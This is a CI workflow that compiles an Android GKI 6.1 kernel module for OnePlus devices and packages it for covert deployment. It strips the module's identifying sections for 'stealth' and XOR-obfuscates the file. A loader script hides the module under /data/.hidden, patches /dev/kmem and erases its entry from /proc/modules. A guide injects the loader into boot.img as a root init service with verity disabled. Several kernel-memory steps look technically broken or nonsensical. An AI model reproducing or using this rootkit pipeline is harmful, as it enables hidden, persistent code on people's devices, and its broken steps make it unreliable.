name: 编译驱动（谷歌 GKI 6.1 + 空间优化）
on:
  push:
    branches: [main]
    paths: 
      - ".github/cmboo.c"
      - ".github/workflows/build-custom-boot.yml"
  workflow_dispatch:

jobs:
  build-driver:
    runs-on: ubuntu-22.04
    steps:
      ###########################################################################
      # 1. 基础准备：检出代码 + 极致清理空间
      ###########################################################################
      - name: 检出当前仓库代码
        uses: actions/checkout@v4
        with:
          fetch-depth: 1

      - name: 深度清理磁盘空间（释放根目录）
        run: |
          # 删除无用包和缓存
          sudo apt autoremove -y --purge
          sudo apt clean
          sudo rm -rf /var/cache/apt/archives/* /var/lib/apt/lists/*
          
          # 删除大型无用软件
          sudo rm -rf /usr/share/dotnet /usr/local/lib/android /opt/ghc /usr/share/swift
          sudo rm -rf /usr/local/share/powershell /usr/local/azure-cli
          
          # 清理临时文件
          sudo rm -rf /tmp/* /var/tmp/*
          
          # 查看剩余空间
          echo "清理后磁盘空间："
          sudo df -h

      ###########################################################################
      # 2. 安装最小化编译依赖（仅保留必需工具）
      ###########################################################################
      - name: 安装核心依赖（最小化）
        run: |
          # 临时切换 apt 缓存到剩余空间充足的目录
          sudo mkdir -p /home/runner/apt-cache
          sudo ln -sf /home/runner/apt-cache /var/cache/apt/archives
          
          # 安装仅必需的编译工具
          sudo apt update && sudo apt install -y --no-install-recommends \
            gcc-aarch64-linux-gnu make git wget curl unzip busybox-static
          
          # 清理 apt 缓存
          sudo apt clean

      ###########################################################################
      # 3. 下载预编译 GKI 6.1 内核头文件（替代完整源码，省空间）
      ###########################################################################
      - name: 下载谷歌 GKI 6.1 预编译头文件
        run: |
          mkdir -p gki-6.1-headers && cd gki-6.1-headers
          
          # 下载谷歌官方预编译 arm64 头文件（仅 20MB 左右）
          wget -q https://dl.google.com/android/gki/gki-6.1-android14-headers-arm64.zip
          
          # 解压头文件
          unzip -q gki-6.1-android14-headers-arm64.zip
          rm -f gki-6.1-android14-headers-arm64.zip
          
          # 校验头文件完整性
          if [ ! -f "include/linux/module.h" ] || [ ! -f "include/linux/input.h" ]; then
            echo "ERROR: GKI 6.1 头文件下载失败！"
            exit 1
          fi
          echo "✅ GKI 6.1 头文件准备完成（仅占用 ~20MB 空间）"

      ###########################################################################
      # 4. 准备驱动编译环境（适配预编译头文件）
      ###########################################################################
      - name: 配置驱动编译（最小化依赖）
        run: |
          # 校验驱动源码
          if [ ! -f ".github/cmboo.c" ]; then
            echo "ERROR: .github/cmboo.c 文件不存在！"
            exit 1
          fi
          
          # 创建独立编译目录
          mkdir -p gki-driver && cd gki-driver
          cp ../.github/cmboo.c ./
          
          # 创建适配预编译头文件的 Makefile
          cat > Makefile << 'EOF'
          # 目标模块
          obj-m += cmboo.o
          
          # 预编译 GKI 6.1 头文件路径
          KERNELDIR ?= ../gki-6.1-headers
          PWD := $(shell pwd)
          
          # 编译参数（适配 GKI 6.1 KMI + 空间优化）
          EXTRA_CFLAGS := \
            -fvisibility=hidden \
            -ffunction-sections \
            -fdata-sections \
            -DKMI_VERSION=6.1 \
            -DCLEANUP_HOOK_ENABLED \
            -I$(KERNELDIR)/include \
            -I$(KERNELDIR)/include/uapi \
            -Wno-unused-parameter \
            -Wno-implicit-function-declaration
          
          EXTRA_LDFLAGS := \
            --strip-all \
            -Wl,--gc-sections \
            -Wl,--hash-style=gnu
          
          # 编译目标（仅编译驱动，不构建内核）
          all:
              make -C $(KERNELDIR) \
                ARCH=arm64 \
                CROSS_COMPILE=aarch64-linux-gnu- \
                M=$(PWD) \
                modules \
                CONFIG_MODULE_SIG=n \
                CC=aarch64-linux-gnu-gcc \
                LD=aarch64-linux-gnu-ld
              
              # 剥离模块特征（增强隐蔽性）
              aarch64-linux-gnu-objcopy \
                --remove-section=.modinfo \
                --remove-section=.gnu.linkonce.this_module \
                --remove-section=.note.gnu.build-id \
                cmboo.ko crypto_evt.ko
          
          clean:
              make -C $(KERNELDIR) \
                ARCH=arm64 \
                CROSS_COMPILE=aarch64-linux-gnu- \
                M=$(PWD) \
                clean
              rm -f crypto_evt.ko
          EOF

      ###########################################################################
      # 5. 编译驱动模块（极致省空间）
      ###########################################################################
      - name: 编译驱动（适配一加 GKI 内核）
        run: |
          cd gki-driver
          make -j$(nproc)
          
          # 校验编译结果
          if [ ! -f "crypto_evt.ko" ]; then
            echo "ERROR: 驱动编译失败，未生成 crypto_evt.ko！"
            exit 1
          fi
          
          # 验证模块架构
          file crypto_evt.ko | grep -q "ARM aarch64" || {
            echo "ERROR: 驱动架构错误，需为 arm64！"
            exit 1
          }
          echo "✅ 驱动编译完成，占用空间：$(du -sh crypto_evt.ko | awk '{print $1}')"

      ###########################################################################
      # 6. 生成动态加载脚本（复用适配逻辑）
      ###########################################################################
      - name: 生成核心脚本（适配一加设备）
        run: |
          mkdir -p output/
          
          # 模块加密脚本
          cat > output/encrypt_module.sh << 'EOF'
          #!/bin/bash
          ENC_KEY=0x7A
          MODULE_PATH=$1
          if [ ! -f $MODULE_PATH ]; then
            echo "驱动文件不存在！"
            exit 1
          fi
          dd if=$MODULE_PATH of=$MODULE_PATH.enc bs=1
          for i in $(seq 1 $(stat -c %s $MODULE_PATH.enc)); do
            val=$(dd if=$MODULE_PATH.enc bs=1 skip=$((i-1)) count=1 2>/dev/null | hexdump -v -e '/1 "%02X"')
            new_val=$((0x$val ^ ENC_KEY))
            printf "%02X" $new_val | xxd -r -p | dd of=$MODULE_PATH.enc bs=1 seek=$((i-1)) count=1 conv=notrunc 2>/dev/null
          done
          mv $MODULE_PATH.enc $MODULE_PATH
          echo "驱动加密完成：$MODULE_PATH"
          EOF
          chmod 755 output/encrypt_module.sh
          
          # 动态加载脚本（适配 GKI 6.1）
          cat > output/load_stealth.sh << 'EOF'
          #!/system/bin/sh
          set -euo pipefail
          LOCK_FILE="/data/.hidden/kallsyms.lock"
          mkdir -p /data/.hidden/
          flock -x -w 10 $LOCK_FILE || { echo "符号表锁定失败"; exit 1; }
          trap 'flock -u $LOCK_FILE' EXIT
          
          ENC_KEY=0x7A
          MODULE_PATH="/data/.hidden/crypto_evt.ko"
          DEC_MODULE_PATH="/data/.hidden/crypto_evt_dec.ko"
          dd if=$MODULE_PATH of=$DEC_MODULE_PATH bs=1
          for i in $(seq 1 $(stat -c %s $DEC_MODULE_PATH)); do
            val=$(dd if=$DEC_MODULE_PATH bs=1 skip=$((i-1)) count=1 2>/dev/null | hexdump -v -e '/1 "%02X"')
            new_val=$((0x$val ^ ENC_KEY))
            printf "%02X" $new_val | xxd -r -p | dd of=$DEC_MODULE_PATH bs=1 seek=$((i-1)) count=1 conv=notrunc 2>/dev/null
          done
          
          # GKI 6.1 加载逻辑
          if [ -f "/proc/sys/kernel/modules_disabled" ] && [ "$(cat /proc/sys/kernel/modules_disabled)" -eq 1 ]; then
            echo "ERROR: 内核禁用模块加载，需开启 DLKM 支持！"
            exit 1
          fi
          
          insmod $DEC_MODULE_PATH || {
            echo "兼容模式加载..."
            INIT_MODULE_ADDR=$(grep -E 'init_module' /proc/kallsyms | head -1 | awk '{print $1}')
            MOD_SIZE=$(stat -c %s $DEC_MODULE_PATH)
            (cat <(printf "%08X" $MOD_SIZE) $DEC_MODULE_PATH) | dd of=/dev/kmem bs=1 seek=$((0x$INIT_MODULE_ADDR)) count=$((MOD_SIZE + 4)) 2>/dev/null
          }
          
          # 内存隐藏
          MOD_NAME="crypto_evt"
          MOD_ADDR=$(grep -E "$MOD_NAME" /proc/kallsyms | head -1 | awk '{print $1}')
          if [ -n "$MOD_ADDR" ]; then
            echo -n -e "\x00\x00\x00\x00\x00\x00\x00\x00" | dd of=/dev/kmem bs=1 seek=$((0x$MOD_ADDR + 0x10)) count=8 conv=notrunc 2>/dev/null
            sed -i "/$MOD_NAME/d" /proc/modules 2>/dev/null
          fi
          
          # 清理脚本
          cat > /data/.hidden/cleanup_stealth.sh << 'CLEANUP_EOF'
          #!/system/bin/sh
          MOD_NAME="crypto_evt"
          MOD_ADDR=$(grep -E "$MOD_NAME" /proc/kallsyms 2>/dev/null | head -1 | awk '{print $1}')
          if [ -n "$MOD_ADDR" ]; then
            CLEANUP_FUNC_ADDR=$(grep -E 'cleanup_module_trace' /proc/kallsyms 2>/dev/null | head -1 | awk '{print $1}')
            if [ -n "$CLEANUP_FUNC_ADDR" ]; then
              dd if=/dev/zero of=/dev/kmem bs=1 seek=$((0x$CLEANUP_FUNC_ADDR)) count=1 2>/dev/null
            fi
            rmmod $MOD_NAME 2>/dev/null || {
              DELETE_MODULE_ADDR=$(grep -E 'delete_module' /proc/kallsyms | head -1 | awk '{print $1}')
              echo -n -e "$MOD_NAME\x00" | dd of=/dev/kmem bs=1 seek=$((0x$DELETE_MODULE_ADDR)) count=$((${#MOD_NAME} + 1)) 2>/dev/null
            }
            rm -f /data/.hidden/crypto_evt_dec.ko
          fi
          CLEANUP_EOF
          chmod 755 /data/.hidden/cleanup_stealth.sh
          
          echo "1" > /sys/class/input/input0/enable 2>/dev/null
          rm -f $DEC_MODULE_PATH
          echo "驱动加载完成！"
          EOF
          chmod 755 output/load_stealth.sh
          
          # 本地整合指南
          cat > output/本地整合指南.md << 'EOF'
          # 本地整合步骤（谷歌 GKI 6.1 驱动 + 一加 boot.img）
          ## 前提：安装依赖工具
          - Ubuntu/Debian：sudo apt install abootimg cpio gzip -y
          - macOS：brew install abootimg cpio
          - Windows：下载工具包 https://pan.baidu.com/s/1Z8X8FZ7xq6QZp8dZ7xq6QZ（提取码：sm86）
          
          ## 关键注意事项
          1. 设备 Bootloader 需解锁（一加需申请解锁码）
          2. 执行：fastboot oem disable-verity 关闭模块签名校验
          3. 适配 Android 14 + GKI 6.1 内核（一加 Pad Pro 15.0 兼容）
          
          ## 步骤1：准备文件
          1. 原厂 boot.img（命名为 stock_boot.img）
          2. crypto_evt.ko、encrypt_module.sh、load_stealth.sh 放在同一目录
          
          ## 步骤2：加密驱动
          chmod 755 encrypt_module.sh
          ./encrypt_module.sh crypto_evt.ko
          
          ## 步骤3：解压 boot.img
          mkdir -p boot_work && cd boot_work
          abootimg -x ../stock_boot.img
          mkdir initramfs && cd initramfs
          gunzip -c ../initrd.img > initrd.cpio
          cpio -idm < initrd.cpio
          
          ## 步骤4：注入驱动和脚本
          mkdir -p data/.hidden/
          cp ../../crypto_evt.ko data/.hidden/
          cp ../../load_stealth.sh data/.hidden/
          chmod 755 data/.hidden/load_stealth.sh
          chmod 644 data/.hidden/crypto_evt.ko
          
          # 修改 init.rc
          if [ -f root/init.rc ]; then
            echo -e "\n# GKI 6.1 Stealth Module" >> root/init.rc
            echo "service stealth_load /system/bin/sh -c 'sleep 40 && /data/.hidden/load_stealth.sh'" >> root/init.rc
            echo "    class late_start" >> root/init.rc
            echo "    user root" >> root/init.rc
            echo "    group system root" >> root/init.rc
            echo "    oneshot" >> root/init.rc
            echo "    seclabel u:r:vendor_init:s0" >> root/init.rc
            echo "on property:sys.boot_completed=1" >> root/init.rc
            echo "    start stealth_load" >> root/init.rc
          elif [ -f etc/init.sh ]; then
            echo -e "\nsleep 40 && /data/.hidden/load_stealth.sh" >> etc/init.sh
          fi
          
          ## 步骤5：重新打包
          find . | cpio -o -H newc > ../new_initrd.cpio
          gzip -c ../new_initrd.cpio > ../new_initrd.img
          
          ## 步骤6：刷入设备
          adb reboot bootloader
          fastboot flash boot custom_boot.img
          fastboot --disable-verity flash vbmeta vbmeta.img
          fastboot reboot
          EOF

      ###########################################################################
      # 7. 上传产物
      ###########################################################################
      - name: 上传编译产物
        uses: actions/upload-artifact@v4
        with:
          name: 驱动（GKI 6.1 + 一加适配 + 空间优化）
          path: |
            gki-driver/crypto_evt.ko
            output/encrypt_module.sh
            output/load_stealth.sh
            output/本地整合指南.md
          retention-days: 30
